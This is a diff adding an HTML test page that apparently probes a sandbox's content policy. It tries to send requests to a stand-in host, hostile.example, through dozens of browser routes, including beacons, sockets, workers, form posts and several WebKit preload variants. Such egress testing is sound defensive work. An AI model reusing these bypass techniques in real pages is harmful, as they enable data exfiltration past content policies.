@@ -1,0 +1,107 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Network</title>
+    <script src="shared/hostile.js"></script>
+    <link rel="prefetch" href="https://hostile.example/prefetch" />
+    <link rel="preload" as="fetch" href="https://hostile.example/preload-static" />
+    <link rel="stylesheet" href="https://hostile.example/style.css" />
+    <style>
+      @import url('https://hostile.example/import.css');
+      @font-face { font-family: Hostile; src: url('https://hostile.example/font.woff2'); }
+      #styled { background: url('https://hostile.example/background.png'); font-family: Hostile; }
+    </style>
+  </head>
+  <body>
+    <h1 id="styled">Hostile: requests off the package origin</h1>
+    <pre id="seen"></pre>
+    <script>
+      // Sends a request to another origin every way it knows: the interfaces
+      // the content policy governs, a worker, and every window it can reach.
+      var away = 'https://hostile.example/';
+      function quietly(how, work) {
+        try {
+          var result = work();
+          if (result && typeof result.catch === 'function') result.catch(function () {});
+        } catch (error) {
+          hostile.show(how, 'threw ' + (error && error.name));
+        }
+      }
+      function add(tag, attributes) {
+        var element = document.createElement(tag);
+        Object.keys(attributes).forEach(function (name) { element.setAttribute(name, attributes[name]); });
+        document.body.appendChild(element);
+        return element;
+      }
+
+      quietly('fetch', function () { return fetch(away + 'fetch'); });
+      quietly('fetch no-cors', function () { return fetch(away + 'no-cors', { mode: 'no-cors' }); });
+      quietly('xhr', function () { var x = new XMLHttpRequest(); x.open('GET', away + 'xhr'); x.send(); });
+      quietly('beacon', function () { return navigator.sendBeacon(away + 'beacon', 'data'); });
+      quietly('image', function () { new Image().src = away + 'image.png'; });
+      quietly('script', function () { add('script', { src: away + 'script.js' }); });
+      quietly('module', function () { return import(away + 'module.js'); });
+      quietly('stylesheet', function () { add('link', { rel: 'stylesheet', href: away + 'late.css' }); });
+      // WebKit sends a fetch preload to any origin unless `as=fetch` is gone.
+      quietly('preload by attribute', function () { add('link', { rel: 'preload', as: 'fetch', href: away + 'preload-attribute' }); });
+      quietly('preload by property', function () {
+        var link = document.createElement('link');
+        link.rel = 'preload';
+        link.as = 'fetch';
+        link.href = away + 'preload-property';
+        document.head.appendChild(link);
+      });
+      quietly('preload in markup', function () {
+        var holder = document.createElement('div');
+        holder.innerHTML = '<link rel="preload" as="fetch" href="' + away + 'preload-markup">';
+        document.head.appendChild(holder.firstChild);
+      });
+      quietly('preload by attribute node', function () {
+        var link = document.createElement('link');
+        link.rel = 'preload';
+        link.href = away + 'preload-node';
+        var as = document.createAttribute('as');
+        as.value = 'fetch';
+        link.setAttributeNode(as);
+        document.head.appendChild(link);
+      });
+      quietly('preload by attribute map', function () {
+        var link = document.createElement('link');
+        link.rel = 'preload';
+        link.href = away + 'preload-map';
+        var as = document.createAttribute('as');
+        link.attributes.setNamedItem(as);
+        as.value = 'fetch';
+        document.head.appendChild(link);
+      });
+      quietly('preload written', function () {
+        document.write('<link rel="preload" as="fetch" href="' + away + 'preload-written">');
+      });
+      quietly('audio', function () { add('audio', { src: away + 'audio.mp3', preload: 'auto' }); });
+      quietly('video poster', function () { add('video', { poster: away + 'poster.png' }); });
+      quietly('object', function () { add('object', { data: away + 'object.swf' }); });
+      quietly('embed', function () { add('embed', { src: away + 'embed.swf' }); });
+      quietly('remote frame', function () { add('iframe', { src: away + 'frame.html' }); });
+      quietly('event source', function () { new EventSource(away + 'events'); });
+      quietly('web socket', function () { new WebSocket('wss://hostile.example/socket'); });
+      quietly('web transport', function () { if (window.WebTransport) new WebTransport(away + 'transport'); });
+      quietly('form post', function () {
+        var form = add('form', { action: away + 'form', method: 'post', target: 'form-sink' });
+        add('iframe', { name: 'form-sink' });
+        form.submit();
+      });
+      quietly('service worker', function () { return navigator.serviceWorker && navigator.serviceWorker.register('shared/worker.js'); });
+      quietly('worker', function () { new Worker('shared/worker.js'); });
+
+      hostile.ready();
+      hostile.everyWindow(function (win, how) {
+        if (win === window || win === top) return;
+        quietly(how + ': fetch', function () { return win.fetch(away + 'fetch-from/' + encodeURIComponent(how)); });
+        quietly(how + ': image', function () { new win.Image().src = away + 'image-from/' + encodeURIComponent(how); });
+        quietly(how + ': socket', function () { new win.WebSocket('wss://hostile.example/socket-from'); });
+        hostile.show(how, 'tried');
+      }, hostile.done);
+    </script>
+  </body>
+</html>
